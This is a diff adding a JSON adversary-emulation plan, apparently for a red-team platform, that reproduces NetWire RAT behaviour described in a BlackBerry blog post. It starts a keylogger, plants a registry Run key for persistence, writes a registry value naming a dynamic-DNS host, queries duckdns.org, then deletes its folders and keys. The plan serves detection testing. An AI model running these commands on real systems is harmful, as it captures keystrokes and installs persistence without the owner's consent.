@@ -1,0 +1,155 @@
+{
+    "threat": {
+        "category": "User-Defined",
+        "description": "NetWire RAT CTI Emulation from BlackBerry ThreatVector Blog.\nhttps://blogs.blackberry.com/en/2021/09/threat-thursday-netwire-rat-is-coming-down-the-line",
+        "display_name": "NetWire RAT",
+        "name": "NetWire RAT",
+        "operating_system_name": "windows",
+        "script": {
+            "0": {
+                "conf": "--cp 127.0.0.1:443 --secure true --multipart 10240 --heartbeat 1",
+                "module": "https",
+                "type": "initialization"
+            },
+            "1": {
+                "module": "loader",
+                "module_to_load": "keylogger",
+                "request": "--load keylogger",
+                "type": "message"
+            },
+            "2": {
+                "depends_on": "8085957f-b422-48cb-960b-1f077790299d",
+                "module": "keylogger",
+                "request": "--start",
+                "rtags": [
+                    "scythe",
+                    "att&ck",
+                    "att&ck-tactic:TA0009",
+                    "att&ck-technique:T1056.001"
+                ],
+                "type": "message"
+            },
+            "3": {
+                "module": "loader",
+                "module_to_load": "run",
+                "request": "--load run",
+                "type": "message"
+            },
+            "4": {
+                "module": "loader",
+                "module_to_load": "file",
+                "request": "--load file",
+                "type": "message"
+            },
+            "5": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "powershell mkdir \"%AppData%\\_NetWire_Install\"",
+                "rtags": [
+                    "att&ck-technique:T1059.001"
+                ],
+                "type": "message"
+            },
+            "6": {
+                "depends_on": "e96eccc9-6c98-4246-b809-1849684c7df2",
+                "module": "file",
+                "request": "--create --path \"%AppData%\\_NetWire_Install\\Host.exe\" --size 1MB --count 1 --random",
+                "type": "message"
+            },
+            "7": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c REG ADD HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v NetWire /t REG_SZ /d \"%AppData%\\_NetWire_Install\\Host.exe\"",
+                "rtags": [
+                    "att&ck-technique:T1547.001"
+                ],
+                "type": "message"
+            },
+            "8": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c REG ADD HKEY_CURRENT_USER\\Software\\Netwire /v HostID /d sample.ddns.net",
+                "rtags": [
+                    "att&ck-technique:T1112"
+                ],
+                "type": "message"
+            },
+            "9": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "powershell mkdir \"%AppData%\\_NetWire_Logs\"",
+                "rtags": [
+                    "att&ck-technique:T1059.001"
+                ],
+                "type": "message"
+            },
+            "10": {
+                "depends_on": "e96eccc9-6c98-4246-b809-1849684c7df2",
+                "module": "file",
+                "request": "--create --path \"%AppData%\\_NetWire_Logs\\03-07-1985\" --size 1KB --count 1 --random",
+                "rtags": [
+                    "att&ck-technique:T1074.001"
+                ],
+                "type": "message"
+            },
+            "11": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "nslookup duckdns.org",
+                "rtags": [
+                    "att&ck-technique:T1568"
+                ],
+                "type": "message"
+            },
+            "12": {
+                "name": "STEP",
+                "type": "assign",
+                "value": "CLEAN UP"
+            },
+            "13": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c rmdir /s /q \"%AppData%\\_NetWire_Install\"",
+                "type": "message"
+            },
+            "14": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c rmdir /s /q \"%AppData%\\_NetWire_Logs\"",
+                "type": "message"
+            },
+            "15": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v NetWire /f",
+                "type": "message"
+            },
+            "16": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c REG DELETE HKEY_CURRENT_USER\\Software\\Netwire /f",
+                "rtags": [],
+                "type": "message"
+            },
+            "17": {
+                "depends_on": "8085957f-b422-48cb-960b-1f077790299d",
+                "module": "keylogger",
+                "request": "--current",
+                "type": "message"
+            },
+            "18": {
+                "depends_on": "8085957f-b422-48cb-960b-1f077790299d",
+                "module": "keylogger",
+                "request": "--stop",
+                "type": "message"
+            },
+            "19": {
+                "depends_on": "8a328046-158f-4bce-bc3c-3c9b5b177512",
+                "module": "controller",
+                "request": "--shutdown",
+                "type": "message"
+            }
+        },
+        "signature": "3ce1cbeedb097e1a0c3b83ebdd6c955a7433cf29"
+    }
+}
